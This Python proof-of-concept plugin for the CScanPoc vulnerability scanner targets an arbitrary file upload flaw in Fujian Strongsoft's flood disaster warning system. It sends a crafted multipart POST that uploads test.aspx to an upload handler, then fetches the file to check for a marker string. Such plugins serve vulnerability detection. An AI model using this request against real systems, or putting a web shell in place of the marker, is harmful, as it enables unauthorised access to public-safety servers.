# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    vuln_id = 'strongsoft_0012' # 平台漏洞编号，留空
    name = '四创灾害预警系统 文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = '2014-06-05'  # 漏洞公布时间
    desc = '''
        福建四创软件开发的“山洪灾害预警监测系统” 过滤不完整导致任意文件上传。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '四创灾害预警系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '68de2316-9da6-4436-94e3-fc834c79f46f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #__Refer___ = http://wooyun.org/bugs/wooyun-2014-063623
            hh = hackhttp.hackhttp()
            p = urlparse.urlparse(self.target)
            raw="""
POST /plan/AjaxHandle/UpLoadFloodPlanFile.ashx?doc=plan HTTP/1.1
Host: {netloc}
Content-Length: 537
Origin: {scheme}://{netloc}
X-Requested-With: ShockwaveFlash/19.0.0.226
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Content-Type: multipart/form-data; boundary=----------GI3cH2Ij5gL6ae0Ij5Ij5ei4ei4ei4
Accept: */*
Referer: {scheme}://{netloc}/plan/FloodPlan/FloodPlanFile.aspx?adcd=331081001003000&ID=0&filetype=156&ParentID=0&adomParameter=625
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
Cookie: ASP.NET_SessionId=bhqaiw55nxkgrdqj3tfprx45; CheckCode=4FXD

------------GI3cH2Ij5gL6ae0Ij5Ij5ei4ei4ei4
Content-Disposition: form-data; name="Filename"

test.aspx
------------GI3cH2Ij5gL6ae0Ij5Ij5ei4ei4ei4
Content-Disposition: form-data; name="folder"

/plan/FloodPlan/
------------GI3cH2Ij5gL6ae0Ij5Ij5ei4ei4ei4
Content-Disposition: form-data; name="Filedata"; filename="test.aspx"
Content-Type: application/octet-stream

testvul_test
------------GI3cH2Ij5gL6ae0Ij5Ij5ei4ei4ei4
Content-Disposition: form-data; name="Upload"

Submit Query
------------GI3cH2Ij5gL6ae0Ij5Ij5ei4ei4ei4--"""
            code, head, res, errcode,  _ = hh.http(self.target + '/plan/AjaxHandle/UpLoadFloodPlanFile.ashx?doc=plan',raw=raw.format(scheme=p.scheme,netloc=p.netloc))
            if code == 200 and res:
                m = re.search(r'(\d+\.aspx)', res)
                if m:
                    file_url = 'http://%s/UploadFile/plan/%s'%(p.netloc,m.group())
                    code, head, res, errcode, _ = hh.http(file_url)
                    if 'testvul_test' in res:
                        #security_hole(arg+":Upload File at "+file_url)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
